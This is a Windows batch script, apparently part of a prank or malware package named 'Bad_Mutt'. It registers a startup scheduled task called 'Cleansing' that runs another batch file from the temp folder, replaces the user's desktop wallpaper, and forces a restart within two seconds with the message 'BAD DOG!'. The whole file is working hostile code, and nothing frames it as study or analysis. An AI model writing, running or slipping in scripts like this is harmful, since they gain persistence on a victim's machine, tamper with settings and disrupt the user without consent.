@echo off
schtasks /create /sc ONSTART /tn Cleansing /tr %TEMP%\Bad_Mutt-0.1\Revanant.bat

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\Bad_Mutt-0.1\uh.png" /f


shutdown /r /t 2 /c "BAD DOG!"